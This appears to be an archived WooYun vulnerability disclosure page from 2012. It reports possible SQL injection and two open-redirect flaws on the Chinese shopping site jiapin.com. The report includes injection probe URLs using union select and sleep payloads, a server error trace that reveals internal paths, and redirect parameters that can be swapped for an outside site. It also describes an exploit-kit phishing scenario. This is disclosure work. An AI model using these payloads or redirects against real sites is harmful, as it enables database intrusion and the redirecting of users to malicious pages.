@@ -1,0 +1,234 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		URL Redirection Bug &amp; Possible SQL注射BUG in 佳品网  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		URL Redirection Bug &amp; Possible SQL注射BUG in 佳品网  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Gunther">Gunther</a> 
+</li><li>提交时间：		2012-08-28 15:29</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-08-28：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-09-02：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">There are URL Redirection Bugs &amp; Possible SQL注射BUG in 佳品网</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">Possible SQL注射BUG is found here:<br />
+<br />
+http://www.jiapin.com/listgoods/index/cat_id/+union+select+1,2,+--<br />
+<br />
+http://www.jiapin.com/listgoods/index/cat_id/+sleep(1)%23<br />
+<br />
+</p><pre><code>Accessing that url and you will see the following error:<br />
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#039;union select 1,2, --;#sqlEye::http://www.jiapin.com/listgoods/index/cat_id/+unio&#039; at line 1<br />
+#0 /www/goods/library/Zend/Db/Statement.php(320): Zend_Db_Statement_Pdo-&gt;_execute(Array)<br />
+#1 /www/goods/library/Zend/Db/Adapter/Abstract.php(481): Zend_Db_Statement-&gt;execute(Array)<br />
+#2 /www/goods/library/Zend/Db/Adapter/Pdo/Abstract.php(238): Zend_Db_Adapter_Abstract-&gt;query(&#039;select cat_id,c...&#039;, Array)<br />
+#3 /www/goods/library/Zend/Db/Adapter/Abstract.php(738): Zend_Db_Adapter_Pdo_Abstract-&gt;query(&#039;select cat_id,c...&#039;, Array)<br />
+#4 /www/goods/application/default/models/SeoModel.php(37): Zend_Db_Adapter_Abstract-&gt;fetchAll(&#039;select cat_id,c...&#039;)<br />
+#5 /www/goods/application/default/models/SeoModel.php(62): SeoModel-&gt;seo_search_lists(&#039; union select 1...&#039;)<br />
+#6 /www/goods/application/default/controllers/ListgoodsController.php(30): SeoModel-&gt;seo_TDK(&#039; union select 1...&#039;, NULL, NULL, Array)<br />
+#7 /www/goods/library/Zend/Controller/Action.php(513): ListgoodsController-&gt;indexAction()<br />
+#8 /www/goods/library/Zend/Controller/Dispatcher/Standard.php(295): Zend_Controller_Action-&gt;dispatch(&#039;indexAction&#039;)<br />
+#9 /www/goods/library/Zend/Controller/Front.php(954): Zend_Controller_Dispatcher_Standard-&gt;dispatch(Object(Zend_Controller_Request_Http), Object(Zend_Controller_Response_Http))<br />
+#10 /www/goods/html/bootstrap.php(102): Zend_Controller_Front-&gt;dispatch()<br />
+#11 /www/goods/html/bootstrap.php(31): Application-&gt;dispatch()<br />
+#12 /www/goods/html/index.php(75): Application-&gt;__construct(Array)<br />
+#13 {main}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+Severity: URL Redirection bug<br />
+<br />
+Confidence: Confident<br />
+<br />
+Host: http://user.jiapin.com/<br />
+<br />
+Path: /pageview/pos?app=from_tag&amp;url=http://www.jiapin.com/list/14565.html<br />
+<br />
+<br />
+<br />
+Issue detail:<br />
+<br />
+This is considered quite serious if it&#039;s in a consumer type of website as attackers can make use of this to redirect victims to another website.<br />
+<br />
+<br />
+<br />
+Ok, the flaw is that the original url will look like the following<br />
+<br />
+http://user.jiapin.com/pageview/pos?app=from_tag&amp;url=http://www.jiapin.com/list/14565.html<br />
+<br />
+However, an attacker can change the final url to the following<br />
+<br />
+user.jiapin.com/pageview/pos?app=from_tag&amp;url=http://ebay.de<br />
+<br />
+<br />
+<br />
+If attackers have exploit kit, they can redirect victims to their website, fire up an iframe showing the original content from jiapin.com<br />
+<br />
+After they had exploited or trojanised the victim, just do another redirect to the original website.<br />
+<br />
+This way, victims will not notice much. :D In my test case, i redirect user(s) to ebay.de :D<br />
+<br />
+<br />
+<br />
+The other URL Redirection bug could be found here:<br />
+<br />
+http://user.jiapin.com/cps/cpslogin/together/c5ac81fe5e0d6246dcb4c769ead4c3ea?url_t=http://news.jiapin.com/html/zx/jiapinguandi/2012/0822/6690.html<br />
+<br />
+<br />
+<br />
+Similarly, if you replace <br />
+<br />
+http://news.jiapin.com/html/zx/jiapinguandi/2012/0822/6690.html<br />
+<br />
+with http://ebay.de and the final url look like this:<br />
+<br />
+http://user.jiapin.com/cps/cpslogin/together/c5ac81fe5e0d6246dcb4c769ead4c3ea?url_t=http://ebay.de<br />
+<br />
+Victims will be redirected to eBay.de instead </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">Or the image below<br />
+<br />
+</p><p class="detail"><a href="../images/28113315f57d87707e663b2e16fb2466b729e26d.png" target="_blank"><img src="../images/28113315f57d87707e663b2e16fb2466b729e26d.png" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Gunther" title="Gunther">Gunther</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-011450" title="URL Redirection Bug &amp; Possible SQL注射BUG in 佳品网">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2012-08-28 15:29</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="11450";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
